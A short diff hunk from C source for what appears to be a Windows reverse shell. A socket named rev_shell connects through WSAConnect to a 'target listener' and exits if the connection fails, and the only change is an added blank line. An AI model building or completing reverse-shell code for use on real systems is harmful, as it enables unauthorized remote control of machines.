@@ -28,6 +28,7 @@ int main() {
 
   // connect to target listener - Microsoft Documentation
   connection = WSAConnect(rev_shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
+  
   // Connection failed, exit program
   if(connection == SOCKET_ERROR) {
     printf("Connection Failed.. Terminating Program.");
